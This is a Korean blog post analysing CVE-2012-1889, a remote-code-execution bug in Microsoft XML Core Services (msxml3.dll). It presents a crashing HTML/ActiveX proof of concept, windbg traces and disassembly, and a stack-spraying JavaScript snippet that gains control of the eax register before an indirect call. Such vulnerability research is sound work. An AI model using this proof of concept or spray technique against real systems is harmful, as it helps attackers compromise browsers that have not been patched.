---
layout: post
title: "CVE-2012-1889: Microsoft XML Core Services RCE"
date: 2014-05-21 14:14:37 +0900
comments: true
categories: 
---

오래된 버그지만, msxml3.dll 을 공격하는 CVE-2012-1889 에 대한 글.

먼저 POC.

    <html>
    <head>
    <object classid='clsid:f6D90f11-9c73-11d3-b32e-00c04F990bb4' id='ca
    llAX'></object>
    <script type='text/javascript'>
    function getValue() {
        document.getElementById("callAX").object.definition(0);
    }
    </script>
    </head>
    <body onload='getValue()'>
    </body>
    </html>

windbg 로 조사.

    Microsoft (R) Windows Debugger Version 6.12.0002.633 AMD64
    Copyright (c) Microsoft Corporation. All rights reserved.

    This exception may be expected and handled.
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\SysWOW64\msxml3.dll - 
    msxml3!DllRegisterServer+0x889b:
    7221e1b0 ff5118          call    dword ptr [ecx+18h]  ds:002b:fc771901=????????
    0:004:x86> r
    eax=72210ae0 ebx=00000000 ecx=fc7718e9 edx=00000001 esi=72210ae0 edi=0348ee20
    eip=7221e1b0 esp=0348eaa4 ebp=0348ebe0 iopl=0         nv up ei pl nz na po nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
    msxml3!DllRegisterServer+0x889b:
    7221e1b0 ff5118          call    dword ptr [ecx+18h]  ds:002b:fc771901=????????

`call dword ptr [ecx+18h]` 에서 crash 가 발생했다. `ecx` 의 값은 0xfc7718e9

콜스택을 까보자.

    0:004:x86> k
    ChildEBP RetAddr  
    WARNING: Stack unwind information not available. Following frames may be wrong.
    0348ebe0 72201244 msxml3!DllRegisterServer+0x889b
    0348ec1c 72201d4e msxml3!DllGetClassObject+0x23e1b
    0348ec5c 72201ce7 msxml3!DllGetClassObject+0x24925
    0348ec90 72202213 msxml3!DllGetClassObject+0x248be
    0348ecec 72202195 msxml3!DllGetClassObject+0x24dea
    0348ed1c 72aea22a msxml3!DllGetClassObject+0x24d6c
    0348ed58 72aea175 JSCRIPT!IDispatchExInvokeEx2+0x104
    0348ed94 72aea3f6 JSCRIPT!IDispatchExInvokeEx+0x6a
    0348ee54 72aea4a0 JSCRIPT!InvokeDispatchEx+0x98
    0348ee88 72afd8c8 JSCRIPT!VAR::InvokeByName+0x139
    0348eed4 72afd96f JSCRIPT!VAR::InvokeDispName+0x7d
    0348ef00 72afe3e7 JSCRIPT!VAR::InvokeByDispID+0xce
    0348f09c 72af5c9d JSCRIPT!CScriptRuntime::Run+0x2b80
    0348f184 72af5bfb JSCRIPT!ScrFncObj::CallWithFrameOnStack+0xce
    0348f1cc 72af74ac JSCRIPT!ScrFncObj::Call+0x8d
    0348f250 72af4ea4 JSCRIPT!NameTbl::InvokeInternal+0x141
    0348f280 72afe3e7 JSCRIPT!VAR::InvokeByDispID+0x17f
    0348f41c 72af5c9d JSCRIPT!CScriptRuntime::Run+0x2b80
    0348f504 72af5bfb JSCRIPT!ScrFncObj::CallWithFrameOnStack+0xce
    0348f54c 72af5e11 JSCRIPT!ScrFncObj::Call+0x8d
    0348f5c8 72aef3ee JSCRIPT!CSession::Execute+0x15f
    0348f6b0 72aeea2e JSCRIPT!NameTbl::InvokeDef+0x1b5
    0348f734 72ae96de JSCRIPT!NameTbl::InvokeEx+0x12c
    0348f75c 72d2aa7b JSCRIPT!NameTbl::Invoke+0x70
    0348f7f0 72d2ab66 MSHTML!CWindow::ExecuteTimeoutScript+0x87
    0348f848 72d56af7 MSHTML!CWindow::FireTimeOut+0xb6
    0348f858 72d51e57 MSHTML!CStackPtrAry<unsigned long,12>::GetStackSize+0xb6
    0348f87c 752c6238 MSHTML!GlobalWndProc+0x183
    0348f8a8 752c68ea USER32!InternalCallWinProc+0x23
    0348f920 752c7d31 USER32!UserCallWinProcCheckWow+0x109
    0348f980 752c7dfa USER32!DispatchMessageWorker+0x3bc
    0348f990 745204a6 USER32!DispatchMessageW+0xf
    0348fa08 74530446 IEFRAME!CTabWindow::_TabWindowThreadProc+0x452
    0348fac0 760649bd IEFRAME!LCIETab_ThreadProc+0x2c1
    0348fad0 75d03677 iertutil!CIsoScope::RegisterThread+0xab
    0348fadc 776d9d72 KERNEL32!BaseThreadInitThunk+0xe
    0348fb1c 776d9d45 ntdll_776a0000!__RtlUserThreadStart+0x70
    0348fb34 00000000 ntdll_776a0000!_RtlUserThreadStart+0x1b

디스어셈블을 해보자.

    7221e18f 8b45ec          mov     eax,dword ptr [ebp-14h]
    7221e192 8bf0            mov     esi,eax
    7221e194 3bc3            cmp     eax,ebx
    7221e196 7429            je      msxml3!DllRegisterServer+0x88ac (7221e1c1)
    7221e198 ff7528          push    dword ptr [ebp+28h]
    7221e19b 8b08            mov     ecx,dword ptr [eax]
    7221e19d ff7524          push    dword ptr [ebp+24h]
    7221e1a0 ff7520          push    dword ptr [ebp+20h]
    7221e1a3 57              push    edi
    7221e1a4 6a03            push    3
    7221e1a6 ff7514          push    dword ptr [ebp+14h]
    7221e1a9 68c4d31f72      push    offset msxml3!DllGetClassObject+0x1ff9b (721fd3c4)
    7221e1ae 53              push    ebx
    7221e1af 50              push    eax
    7221e1b0 ff5118          call    dword ptr [ecx+18h] <--- !!!
    7221e1b3 89450c          mov     dword ptr [ebp+0Ch],eax
    7221e1b6 8b06            mov     eax,dword ptr [esi]
    7221e1b8 56              push    esi
    7221e1b9 ff5008          call    dword ptr [eax+8]
    7221e1bc e99c3afeff      jmp     msxml3!DllGetClassObject+0x24834 (72201c5d)

IDA Pro 에서 msxml3.dll 을 로드한다. 

{% img /images/cve-2012-1889.png %}

Access violation 이 나는 함수는 `_dispatchImpl::InvokeHelper`. 

    __int32 __stdcall _dispatchImpl::InvokeHelper(void *, 
        struct DISPATCHINFO *, 
        __int32, 
        unsigned __int32, 
        char, 
        struct tagDISPPARAMS *, 
        struct tagVARIANT *,
        struct tagEXCEPINFO *,
        unsigned int *)

Access violation 이 나는 이유는 obj.definition() 함수의 call path 어딘가에서 uninitialized local variable 을 참조하였기때문.

`mov ecx,[eax]` 로 `ecx` 를 셋업하고나서, `call dword ptr [ecx+18h]` 를 하기때문에, eax 를 컨트롤 할 수 있어야 한다.

obj.definition() 함수 call path 에서 uninitialized local variable 을 참조하는 버그를 활용하기 위해, stack spraying 을 수행한다.
`pic.src = src` 가 stack sparying 을 진행하는 코드. `pic.nameProp` 으로 참조를 해준다.

    function getValue() {
        var obj = document.getElementById("callAX").object
        var src = unescape("%u0c08%u0c0c");
        while (src.length < 0x1002) src += src;
        src = "\\\\\\\\xxx" + src;
        src = src.substr(0, 0x1000 - 10);
        var pic = document.createElement("img");
        pic.src = src;
        pic.nameProp;
        obj.definition(0);
    }

으로 하여 crash 를 만든다.

    722ee19b 8b08   mov ecx,dword ptr [eax]
    0:005:x86> r
    eax=0c0c0c08 ebx=00000000 ecx=723115da edx=00000001 esi=0c0c0c08 edi=0326f028
    eip=722ee19b esp=0326eccc ebp=0326ede8 iopl=0

eax 가 컨트롤되고 있다.
